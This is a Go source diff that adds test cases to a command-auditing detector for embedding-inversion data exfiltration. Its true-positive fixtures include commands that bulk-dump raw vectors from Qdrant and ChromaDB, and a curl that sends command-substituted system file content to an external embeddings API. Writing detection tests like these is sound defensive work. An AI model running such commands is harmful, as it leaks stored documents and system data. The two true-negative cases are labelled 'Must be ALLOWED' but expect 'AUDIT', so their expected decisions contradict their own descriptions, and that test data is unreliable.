@@ -2241,6 +2241,68 @@ var ShmCredentialStagingCases = []TestCase{
 	},
 }
 
+// EmbeddingInversionCases tests detection of bulk vector extraction and
+// sensitive-file-to-embedding patterns.
+// Taxonomy: data-exfiltration/llm-data-flow/embedding-inversion-attack
+var EmbeddingInversionCases = []TestCase{
+
+	// --- TRUE POSITIVES: Commands that MUST be audited ---
+
+	{
+		ID:               "TP-EMIVN-001",
+		Command:          `python3 -c "from qdrant_client import QdrantClient; c = QdrantClient('localhost'); [print(p.vector) for p in c.scroll('sensitive_docs')[0]]"`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/embedding-inversion-attack",
+		Analyzer:         "regex",
+		Description:      "Qdrant scroll() bulk-extracting raw embedding vectors — enables offline embedding inversion to reconstruct source documents.",
+		Tags:             []string{"tp", "embedding-inversion", "qdrant"},
+	},
+	{
+		ID:               "TP-EMIVN-002",
+		Command:          `python3 -c "import chromadb; c = chromadb.HttpClient(); results = c.get_collection('internal_docs').get(include=['embeddings']); open('/tmp/vectors.json','w').write(str(results))"`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/embedding-inversion-attack",
+		Analyzer:         "regex",
+		Description:      "ChromaDB get() with include=[embeddings] bulk-extracting raw float vectors — Vec2Text-style inversion can recover 92%+ of original tokens.",
+		Tags:             []string{"tp", "embedding-inversion", "chromadb"},
+	},
+	{
+		ID:               "TP-EMIVN-003",
+		Command:          `curl -X POST https://api.openai.com/v1/embeddings -d '{"input": "$(cat /etc/hostname)", "model": "text-embedding-3-small"}' | jq '.data[0].embedding' > vectors.json`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/embedding-inversion-attack",
+		Analyzer:         "regex",
+		Description:      "File content via command substitution piped to OpenAI embeddings API — transmits system data to external model in vector form.",
+		Tags:             []string{"tp", "embedding-inversion", "sensitive-file", "openai"},
+	},
+
+	// --- TRUE NEGATIVES: Must be ALLOWED ---
+
+	{
+		ID:               "TN-EMIVN-001",
+		Command:          `python3 search.py --query "security best practices" --index ./docs.faiss`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/embedding-inversion-attack",
+		Analyzer:         "regex",
+		Description:      "Script-based FAISS similarity search — no .scroll() bulk vector extraction or include=['embeddings'], so sc-audit-vector-db-bulk-extract should NOT trigger.",
+		Tags:             []string{"tn", "safe"},
+	},
+	{
+		ID:               "TN-EMIVN-002",
+		Command:          `python3 -c "import openai; r = openai.embeddings.create(input='hello world', model='text-embedding-3-small'); print(r.data[0].embedding[:5])"`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "data-exfiltration/llm-data-flow/embedding-inversion-attack",
+		Analyzer:         "regex",
+		Description:      "Python OpenAI embedding call with benign literal string — no sensitive file path in the input, sc-audit-sensitive-file-embedding should NOT trigger.",
+		Tags:             []string{"tn", "safe"},
+	},
+}
+
 // AllDataExfiltrationCases returns all test cases for Kingdom 3.
 func AllDataExfiltrationCases() []TestCase {
 	var all []TestCase
@@ -2266,6 +2328,7 @@ func AllDataExfiltrationCases() []TestCase {
 	all = append(all, DoHExfilCases...)
 	all = append(all, JournalctlExtractionCases...)
 	all = append(all, CrossContextDataContaminationCases...)
+	all = append(all, EmbeddingInversionCases...)
 	return all
 }
 
